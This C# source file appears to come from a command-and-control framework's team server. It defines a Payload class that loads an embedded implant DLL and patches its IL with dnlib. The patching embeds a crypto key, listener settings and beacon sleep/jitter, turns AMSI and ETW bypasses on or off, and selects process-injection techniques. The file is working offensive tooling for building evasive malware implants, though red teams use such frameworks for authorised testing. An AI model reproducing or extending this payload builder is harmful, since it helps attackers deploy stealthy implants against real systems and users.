using System;
using System.Linq;
using System.Threading.Tasks;

using dnlib.DotNet;
using dnlib.DotNet.Emit;

using TeamServer.Handlers;

namespace TeamServer.Models
{
    public abstract class Payload
    {
        protected C2Profile C2Profile { get; }
        protected Handler Handler { get; }
        protected string CryptoKey { get; }
        
        public byte[] Bytes { get; protected set; }

        protected Payload(Handler handler, C2Profile c2Profile, string cryptoKey)
        {
            Handler = handler;
            C2Profile = c2Profile;

            CryptoKey = cryptoKey;
        }

        public abstract Task Generate();

        protected async Task<ModuleDefMD> GetDroneModuleDef()
        {
            var drone = await Utilities.GetEmbeddedResource("drone.dll");
            var module = ModuleDefMD.Load(drone);

            EmbedCryptoKey(module);
            EmbedHandler(module);
            SetSleepTime(module);
            SetBypasses(module);
            SetProcessInjectionOptions(module);

            return module;
        }

        private void EmbedCryptoKey(ModuleDef module)
        {
            var type = module.Types.GetType("Crypto");
            var method = type.Methods.GetMethod("Key");
            method.Body.Instructions[0].Operand = CryptoKey;
        }

        private void EmbedHandler(ModuleDef module)
        {
            // get handlers (not including the abstract)
            var handlers = module.Types
                .Where(t => t.FullName.Contains("Drone.Handlers", StringComparison.OrdinalIgnoreCase))
                .Where(t => !t.FullName.Equals("Drone.Handlers.Handler", StringComparison.OrdinalIgnoreCase));
            
            // match the one that matches the abstract name
            // it's actually set in the ctor of all places
            TypeDef targetHandler = null;
            
            foreach (var handler in handlers)
            {
                var ctor = handler.Methods.GetConstructor();
                if (ctor is null) continue;
                
                var instructions = ctor.Body.Instructions.Where(i => i.OpCode == OpCodes.Ldstr);
                
                foreach (var instruction in instructions)
                {
                    if (instruction.Operand is null) continue;
                    var operand = (string) instruction.Operand;
                    if (!operand.Equals(Handler.Name, StringComparison.OrdinalIgnoreCase)) continue;
                    
                    targetHandler = handler;
                    break;
                }
            }

            if (targetHandler is null) throw new Exception("Could not find matching Handler");

            if (Handler.Parameters is not null)
            {
                foreach (var handlerParameter in Handler.Parameters)
                {
                    if (string.IsNullOrWhiteSpace(handlerParameter.Value)) continue;
                    
                    // get matching method in handler
                    var method = targetHandler.Methods.GetMethod(handlerParameter.Name);
                    var instruction = method?.Body.Instructions.FirstOrDefault(i => i.OpCode == OpCodes.Ldstr);
                    if (instruction is null) continue;
                    instruction.Operand = handlerParameter.Value;
                }
            }

            // finally, ensure that the drone is creating an instance of the correct handler
            var droneType = module.Types.GetType("Drone");
            var getHandler = droneType.Methods.GetMethod("get_GetHandler");
            getHandler.Body.Instructions[0].Operand = targetHandler.Methods.GetConstructor();
        }

        private void SetSleepTime(ModuleDef module)
        {
            var type = module.Types.GetType("Utilities");
            
            var sleepInterval = type.Methods.GetMethod("GetSleepInterval");
            sleepInterval.Body.Instructions[0].Operand = C2Profile.Stage.SleepTime;
            
            var sleepJitter = type.Methods.GetMethod("GetSleepJitter");
            sleepJitter.Body.Instructions[0].Operand = C2Profile.Stage.SleepJitter;
        }

        private void SetBypasses(ModuleDef module)
        {
            var utils = module.Types.GetType("Utilities");

            var getBypassAmsi = utils.Methods.GetMethod("GetBypassAmsi");
            SetBypassAmsi(getBypassAmsi);
            
            var getBypassEtw = utils.Methods.GetMethod("GetBypassEtw");
            SetBypassEtw(getBypassEtw);
        }

        private void SetProcessInjectionOptions(ModuleDef module)
        {
            var utils = module.Types.GetType("Utilities");

            // allocation
            var getAllocationTech = utils.Methods.GetMethod("GetAllocationTechnique");
            var alloc = module.Types.GetType(C2Profile.ProcessInjection.Allocation);
            getAllocationTech.Body.Instructions[0].Operand = alloc;
            
            // execution
            var getExecutionTech = utils.Methods.GetMethod("GetExecutionTechnique");
            var exec = module.Types.GetType(C2Profile.ProcessInjection.Execution);
            getExecutionTech.Body.Instructions[0].Operand = exec;
        }

        private void SetBypassAmsi(MethodDef method)
        {
            var instruction = method.Body.Instructions[0];

            instruction.OpCode = C2Profile.PostExploitation.BypassAmsi
                ? OpCodes.Ldc_I4_1
                : OpCodes.Ldc_I4_0;
        }
        
        private void SetBypassEtw(MethodDef method)
        {
            var instruction = method.Body.Instructions[0];

            instruction.OpCode = C2Profile.PostExploitation.BypassEtw
                ? OpCodes.Ldc_I4_1
                : OpCodes.Ldc_I4_0;
        }
    }
}